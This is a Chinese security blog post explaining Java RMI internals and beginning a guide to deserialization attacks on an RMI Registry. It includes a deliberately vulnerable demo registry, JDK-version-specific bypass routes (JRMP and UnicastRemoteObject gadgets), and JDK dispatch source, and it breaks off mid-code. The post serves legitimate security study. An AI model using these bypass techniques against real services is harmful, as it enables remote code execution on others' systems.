<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>Attack RMI - P1n93r - 博学而精一</title><meta name=renderer content="webkit"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=theme-color content="#f8f5ec"><meta name=msapplication-navbutton-color content="#f8f5ec"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec"><meta name=author content="P1n93r"><meta name=description content="基本概念 RMI介绍 RMI（Remote Method Invocation）即远程方法调用。使用RMI可以在客户机上调用远程服务器上的对象。RMI是一种行"><meta name=keywords content="Security,Java,Web,Android"><meta name=generator content="Hugo 0.98.0 with theme even"><link rel=canonical href=https://p1n93r.github.io/post/security/attack_rmi/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/manifest.json><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script>
<link href=/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><meta property="og:title" content="Attack RMI"><meta property="og:description" content="基本概念 RMI介绍 RMI（Remote Method Invocation）即远程方法调用。使用RMI可以在客户机上调用远程服务器上的对象。RMI是一种行"><meta property="og:type" content="article"><meta property="og:url" content="https://p1n93r.github.io/post/security/attack_rmi/"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-07-04T17:07:36+08:00"><meta property="article:modified_time" content="2021-07-04T17:07:36+08:00"><meta itemprop=name content="Attack RMI"><meta itemprop=description content="基本概念 RMI介绍 RMI（Remote Method Invocation）即远程方法调用。使用RMI可以在客户机上调用远程服务器上的对象。RMI是一种行"><meta itemprop=datePublished content="2021-07-04T17:07:36+08:00"><meta itemprop=dateModified content="2021-07-04T17:07:36+08:00"><meta itemprop=wordCount content="8792"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="Attack RMI"><meta name=twitter:description content="基本概念 RMI介绍 RMI（Remote Method Invocation）即远程方法调用。使用RMI可以在客户机上调用远程服务器上的对象。RMI是一种行"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=/ class=logo>P1n93r</a></div><div class=mobile-navbar-icon><span></span>
<span></span>
<span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=/><li class=mobile-menu-item>Home</li></a><a href=/post/><li class=mobile-menu-item>Archives</li></a><a href=/tags/><li class=mobile-menu-item>Tags</li></a><a href=/categories/><li class=mobile-menu-item>Categories</li></a><a href=/about/><li class=mobile-menu-item>About</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=/ class=logo>P1n93r</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=/>Home</a></li><li class=menu-item><a class=menu-item-link href=/post/>Archives</a></li><li class=menu-item><a class=menu-item-link href=/tags/>Tags</a></li><li class=menu-item><a class=menu-item-link href=/categories/>Categories</a></li><li class=menu-item><a class=menu-item-link href=/about/>About</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>Attack RMI</h1><div class=post-meta><span class=post-time>2021-07-04</span><div class=post-category><a href=/categories/security/>security</a></div><span class=more-meta>约 8792 字</span>
<span class=more-meta>预计阅读 18 分钟</span>
<span id=busuanzi_container_page_pv class=more-meta><span id=busuanzi_value_page_pv><img src=/img/spinner.svg alt=spinner.svg></span> 次阅读</span></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>文章目录</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><ul><li><a href=#基本概念>基本概念</a><ul><li><a href=#rmi介绍>RMI介绍</a></li><li><a href=#jrmp协议介绍>JRMP协议介绍</a></li></ul></li><li><a href=#rmi架构>RMI架构</a></li><li><a href=#攻击路线>攻击路线</a><ul><li><a href=#攻击registry>攻击Registry</a></li><li><a href=#攻击client>攻击Client</a></li><li><a href=#攻击server>攻击Server</a></li></ul></li><li><a href=#外部参考>外部参考</a></li></ul></li></ul></nav></div></div><div class=post-content><h2 id=基本概念>基本概念</h2><h3 id=rmi介绍>RMI介绍</h3><p>RMI（Remote Method Invocation）即远程方法调用。使用RMI可以在客户机上调用远程服务器上的对象。<strong>RMI是一种行为，指的是Java远程方法调用，RMI不是一种协议</strong> 。</p><h3 id=jrmp协议介绍>JRMP协议介绍</h3><p>JRMP（Java Remote Method Protocol）即Java远程方法协议。它是<strong>一种运行在Java远程方法调用（RMI）之下，在TCP/IP之上的线路层协议（Wire Protocol）</strong> 。</p><p>也就是：<strong>JRMP是一个协议，是用于RMI过程中的协议</strong> 。</p><h2 id=rmi架构>RMI架构</h2><p>首先RMI分为三种角色：Client客户端、Server服务端、Registry注册中心。很多时候，可能存在这种情况：Registry和Server在同一个JVM内。但是其实这三者是可以分开的。架构图如下所示：</p><p><img src=/media/2021-07-29-1.png alt></p><p>RMI提出了Stub（客户端存根）和Skeleton（服务端骨架）两个概念，客户端和服务端之间的通信是基于Stub和Skeleton进行的。RMI的整体调用时序图如下图所示：</p><p><img src=/media/2021-07-29-2.png alt></p><p>说明如下：</p><ol><li>Server服务端创建ServiceImpl远程对象，因为ServiceImpl继承自UnicastRemoteObject，所以在创建这个远程对象的时候，会随机绑定一个端口用于监听客户端的请求。</li><li>将创建的ServiceImpl远程对象注册到注册中心。</li><li>Client客户端向Registry注册中心查询远程对象。</li><li>Registry注册中心返回ServiceImpl_stub（远程对象存根）给Client客户端。</li><li>Client客户端通过ServiceImpl_stub请求调用service方法。</li><li>ServiceImpl_stub存根和ServiceImpl_skel服务端骨架通信。</li><li>ServiceImpl_skel调用ServiceImpl的service方法。</li><li>ServiceImpl_skel将函数调用返回结果返回给ServiceImpl_stub。</li><li>ServiceImpl_stub再将结果返回给Client客户端。</li></ol><h2 id=攻击路线>攻击路线</h2><p>整个RMI过程中，存在三个实体：Client、Registry和Server。所以每个实体都是可以被攻击的，所以接下来以被攻击对象作为分类进行分析。以下分析的过程都是基于JDK1.8.0_66（JDK8u121开始加入RMI反序列化白名单，JDK8u191开始存在JEP 290，加入了反序列化过滤），后面再分析怎么绕过这些限制。</p><h3 id=攻击registry>攻击Registry</h3><p>首先说明一下存在如下攻击方式：</p><ol><li>JDK Version &lt; JDK8u121时，调用RegistryImpl_Stub#bind()等方法，直接传递一个恶意序列化对象进行攻击；</li><li>JDK8u121 &lt;= JDK Version &lt; JDK8u231时，使用JRMP Gadget即可绕过JDK的白名单限制；</li><li>JDK8u231 &lt;= JDK Version &lt; JDK8u241时，使用UnicastRemoteObject Gadget可绕过继续绕过；</li></ol><p>我们可以使用如下代码创建一个单纯的RMI Registry：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span> <span class=nn>java.rmi.registry.LocateRegistry</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>java.util.concurrent.CountDownLatch</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * @author : p1n93r
</span></span></span><span class=line><span class=cl><span class=cm> * @date : 2021/7/29 18:30
</span></span></span><span class=line><span class=cl><span class=cm> * 模拟脆弱的RMI Registry服务
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>WeakRegistry</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>main</span><span class=o>(</span><span class=n>String</span><span class=o>[]</span> <span class=n>args</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>LocateRegistry</span><span class=o>.</span><span class=na>createRegistry</span><span class=o>(</span><span class=n>1099</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=k>new</span> <span class=n>CountDownLatch</span><span class=o>(</span><span class=n>1</span><span class=o>).</span><span class=na>await</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>简单的一行代码，就可以启动RMI Registry了，此处需要注意，Registry本身也是一个服务，其数据结构如下：</p><p><img src=/media/2021-07-29-3.png alt></p><p>而我们通过如下代码获取的Registry其实就是一个RegistryImpl_Stub对象，和上面分析的RegistryImpl_Skel进行通信：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Registry</span> <span class=n>registry</span> <span class=o>=</span> <span class=n>LocateRegistry</span><span class=o>.</span><span class=na>getRegistry</span><span class=o>(</span><span class=s>&#34;127.0.0.1&#34;</span><span class=o>,</span> <span class=n>1099</span><span class=o>);</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/media/2021-07-29-4.png alt></p><p>首先清楚一个概念：Skel是在服务端的，Stub是在客户端的，客户端通过Stub访问远端的Skel进行远程调用。并且需要注意，RegistryImpl_Stub是在本地创建的，不是远端传过来的。但是ServiceImpl_Stub是从Registry传过来的。如下所示，是本地创建RegistryImpl_Stub的代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=n>Registry</span> <span class=nf>getRegistry</span><span class=o>(</span><span class=n>String</span> <span class=n>host</span><span class=o>,</span> <span class=kt>int</span> <span class=n>port</span><span class=o>,</span> <span class=n>RMIClientSocketFactory</span> <span class=n>csf</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>LiveRef</span> <span class=n>liveRef</span> <span class=o>=</span> <span class=k>new</span> <span class=n>LiveRef</span><span class=o>(</span><span class=k>new</span> <span class=n>ObjID</span><span class=o>(</span><span class=n>ObjID</span><span class=o>.</span><span class=na>REGISTRY_ID</span><span class=o>),</span>
</span></span><span class=line><span class=cl>                    <span class=k>new</span> <span class=n>TCPEndpoint</span><span class=o>(</span><span class=n>host</span><span class=o>,</span> <span class=n>port</span><span class=o>,</span> <span class=n>csf</span><span class=o>,</span> <span class=kc>null</span><span class=o>),</span> <span class=kc>false</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=n>RemoteRef</span> <span class=n>ref</span> <span class=o>=</span> <span class=o>(</span><span class=n>csf</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>?</span> <span class=k>new</span> <span class=n>UnicastRef</span><span class=o>(</span><span class=n>liveRef</span><span class=o>)</span> <span class=o>:</span> <span class=k>new</span> <span class=n>UnicastRef2</span><span class=o>(</span><span class=n>liveRef</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>(</span><span class=n>Registry</span><span class=o>)</span> <span class=n>Util</span><span class=o>.</span><span class=na>createProxy</span><span class=o>(</span><span class=n>RegistryImpl</span><span class=o>.</span><span class=na>class</span><span class=o>,</span> <span class=n>ref</span><span class=o>,</span> <span class=kc>false</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>我们先看到远端Registry中RegistryImpl_Skel#dispatch方法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kt>void</span> <span class=nf>dispatch</span><span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>Remote</span> <span class=n>obj</span><span class=o>,</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>server</span><span class=o>.</span><span class=na>RemoteCall</span> <span class=n>call</span><span class=o>,</span> <span class=kt>int</span> <span class=n>opnum</span><span class=o>,</span> <span class=kt>long</span> <span class=n>hash</span><span class=o>)</span>
</span></span><span class=line><span class=cl>        <span class=kd>throws</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>Exception</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>hash</span> <span class=o>!=</span> <span class=n>interfaceHash</span><span class=o>)</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>server</span><span class=o>.</span><span class=na>SkeletonMismatchException</span><span class=o>(</span><span class=s>&#34;interface hash mismatch&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>sun</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>registry</span><span class=o>.</span><span class=na>RegistryImpl</span> <span class=n>server</span> <span class=o>=</span> <span class=o>(</span><span class=n>sun</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>registry</span><span class=o>.</span><span class=na>RegistryImpl</span><span class=o>)</span> <span class=n>obj</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=k>switch</span> <span class=o>(</span><span class=n>opnum</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=n>0</span><span class=o>:</span> <span class=c1>// bind(String, Remote)
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>// Check access before reading the arguments
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=n>RegistryImpl</span><span class=o>.</span><span class=na>checkAccess</span><span class=o>(</span><span class=s>&#34;Registry.bind&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span> <span class=n>$param_String_1</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>Remote</span> <span class=n>$param_Remote_2</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>ObjectInput</span> <span class=n>in</span> <span class=o>=</span> <span class=n>call</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>();</span>
</span></span><span class=line><span class=cl>                <span class=n>$param_String_1</span> <span class=o>=</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span><span class=o>)</span> <span class=n>in</span><span class=o>.</span><span class=na>readObject</span><span class=o>();</span>
</span></span><span class=line><span class=cl>                <span class=n>$param_Remote_2</span> <span class=o>=</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>Remote</span><span class=o>)</span> <span class=n>in</span><span class=o>.</span><span class=na>readObject</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>IOException</span> <span class=o>|</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>ClassNotFoundException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>UnmarshalException</span><span class=o>(</span><span class=s>&#34;error unmarshalling arguments&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>finally</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>call</span><span class=o>.</span><span class=na>releaseInputStream</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=n>server</span><span class=o>.</span><span class=na>bind</span><span class=o>(</span><span class=n>$param_String_1</span><span class=o>,</span> <span class=n>$param_Remote_2</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>call</span><span class=o>.</span><span class=na>getResultStream</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>IOException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>MarshalException</span><span class=o>(</span><span class=s>&#34;error marshalling return&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=n>1</span><span class=o>:</span> <span class=c1>// list()
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>call</span><span class=o>.</span><span class=na>releaseInputStream</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span><span class=o>[]</span> <span class=n>$result</span> <span class=o>=</span> <span class=n>server</span><span class=o>.</span><span class=na>list</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>ObjectOutput</span> <span class=n>out</span> <span class=o>=</span> <span class=n>call</span><span class=o>.</span><span class=na>getResultStream</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                <span class=n>out</span><span class=o>.</span><span class=na>writeObject</span><span class=o>(</span><span class=n>$result</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>IOException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>MarshalException</span><span class=o>(</span><span class=s>&#34;error marshalling return&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=n>2</span><span class=o>:</span> <span class=c1>// lookup(String)
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span> <span class=n>$param_String_1</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>ObjectInput</span> <span class=n>in</span> <span class=o>=</span> <span class=n>call</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>();</span>
</span></span><span class=line><span class=cl>                <span class=n>$param_String_1</span> <span class=o>=</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span><span class=o>)</span> <span class=n>in</span><span class=o>.</span><span class=na>readObject</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>IOException</span> <span class=o>|</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>ClassNotFoundException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>UnmarshalException</span><span class=o>(</span><span class=s>&#34;error unmarshalling arguments&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>finally</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>call</span><span class=o>.</span><span class=na>releaseInputStream</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>Remote</span> <span class=n>$result</span> <span class=o>=</span> <span class=n>server</span><span class=o>.</span><span class=na>lookup</span><span class=o>(</span><span class=n>$param_String_1</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>ObjectOutput</span> <span class=n>out</span> <span class=o>=</span> <span class=n>call</span><span class=o>.</span><span class=na>getResultStream</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                <span class=n>out</span><span class=o>.</span><span class=na>writeObject</span><span class=o>(</span><span class=n>$result</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>IOException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>MarshalException</span><span class=o>(</span><span class=s>&#34;error marshalling return&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=n>3</span><span class=o>:</span> <span class=c1>// rebind(String, Remote)
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>// Check access before reading the arguments
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=n>RegistryImpl</span><span class=o>.</span><span class=na>checkAccess</span><span class=o>(</span><span class=s>&#34;Registry.rebind&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span> <span class=n>$param_String_1</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>Remote</span> <span class=n>$param_Remote_2</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>ObjectInput</span> <span class=n>in</span> <span class=o>=</span> <span class=n>call</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>();</span>
</span></span><span class=line><span class=cl>                <span class=n>$param_String_1</span> <span class=o>=</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span><span class=o>)</span> <span class=n>in</span><span class=o>.</span><span class=na>readObject</span><span class=o>();</span>
</span></span><span class=line><span class=cl>                <span class=n>$param_Remote_2</span> <span class=o>=</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>Remote</span><span class=o>)</span> <span class=n>in</span><span class=o>.</span><span class=na>readObject</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>IOException</span> <span class=o>|</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>ClassNotFoundException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
